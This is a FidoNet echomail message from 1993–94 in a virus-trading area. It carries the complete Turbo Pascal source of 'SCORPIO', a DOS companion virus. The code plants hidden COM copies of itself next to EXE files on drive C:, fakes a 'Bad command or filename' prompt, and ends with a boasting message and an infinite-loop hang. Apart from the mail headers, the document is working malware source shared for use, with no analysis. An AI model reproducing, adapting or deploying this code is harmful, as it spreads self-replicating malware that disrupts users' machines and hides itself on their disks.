;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 1 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:10
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : SCORPIO.PAS
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Graham Allen, 2:283/718 (06 Nov 94 16:15)
;* To   : Bill Dirks
;* Subj : SCORPIO.PAS
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Graham.Allen@f718.n283.z2.fidonet.org
program virusman;
{$m 16384,0,0}
uses crt ,dos,graph3;
var
 x:real;
 i,alfa:integer;
 f:file;
 fromfile ,tofile ,thisfile :string[12];
 command :string[50];
 atr,atrr,errdos:integer;
 rec,recc,crec: searchrec;
 fre:longint;
 dirs,dstr:string[30];

procedure demo;
function fu(x:real):real;
begin
fu:=sin(x)/(sin(x)+2)*cos(x)*3.2;
end;
begin
nosound;
hires;
for i:=0 to 640 do
begin
x:=i/50;
draw(i,round(fu(x)*50)+75,i,round(fu(x)*50)+125,1);
end;
writeln('HI I AM SCORPIO FROM R.O.L.E. NOW THIS IS A VIRUS EATING YOUR HARDDISK
');
WRITELN('THE IDEA COMES FROM APOLLO ALSO FROM R.O.L.E. "NOW GIV ME SOM FOOD"
');
WRITELN('I ENJOY EATING EXE FILES       ... HAR  H A R  HAR  ... ');
WRITELN('SAY HELLO TO ALL MEMBERS AND CONTACTS ');
writeln('(THE PROTON WARRIOR;APOLLO;LOTUS;GOLDMAN;CSOKI;....) ');
WRITELN('          CU SOON !!!!!!!!!!!');
REPEAT ALFA:=0 UNTIL ALFA=1;
END;


procedure kopie(command:string);
begin
assign(f,fromfile);
setfattr(f,$10);
close(f);
swapvectors;
exec(getenv('comspec'),command);
swapvectors;
if doserror <> 0 then halt;
assign(f,tofile);
setfattr(f,$02);
close(f);
assign(f,fromfile);
setfattr(f,$02);
close(f);
end;

procedure copyfile;
begin
findfirst('c:*.exe',atr,rec);
if doserror <> 0 then halt else begin
tofile:=rec.name;
delete(tofile,length(tofile)-2,3);
tofile:=concat(tofile,'com');
command:=concat('copy ',fromfile,' c:',tofile);
kopie(command);
end;
end;

procedure executef;
begin
swapvectors;
exec(thisfile,'');
swapvectors;
end;
procedure lookup;
procedure nextfile;
begin
repeat
findnext(recc);
if doserror <> 0 then demo
else
 begin
 tofile:=recc.name;
 delete(tofile,length(tofile)-2,3);
 tofile:=concat(tofile,'com');
 findfirst(tofile,atrr,crec);
 errdos:=doserror;
 end;
until errdos <> 0;
command:=concat('copy ',fromfile,' c:',tofile);
kopie(command);
end;

begin
findfirst('c:*.exe',atr,recc);
if doserror <> 0 then
demo
else
 begin
 tofile:=recc.name;
 delete(tofile,length(tofile)-2,3);
 tofile:=concat(tofile,'com');
 findfirst(tofile,atrr,crec);
 if doserror <> 0 then begin
 command:=concat('copy ',fromfile,' c:',tofile);
 kopie(command);
 end else nextfile;
 end;
end;

procedure direcnow;
begin
getdir(0,dirs);
dirs:=copy (dirs,1,1);
if dirs <> 'c' then
begin
fre:=diskfree(3);
if doserror=0 then
begin
copyfile ;
executef;
end
else
executef
end
else
begin
if fre > 20000 then
begin
lookup;
kopie(command);
executef;
end
else
demo;
end;
end;

BEGIN
setcbreak(false);
gotoxy(7,wherey-1);
write('$');                     writeln;
writeln('Bad command or filename');
writeln;
getdir(0,dstr);
write(dstr);
readln(thisfile);
fromfile:=concat(thisfile,'.com');
thisfile:=concat(thisfile,'.exe');
textcolor(0);
direcnow;
end.
;
;-+-  GoldED 2.50.B1016+
; + Origin: Poeldijk, The Netherlands, Europe, Earth (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;/l            Include source line numbers
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

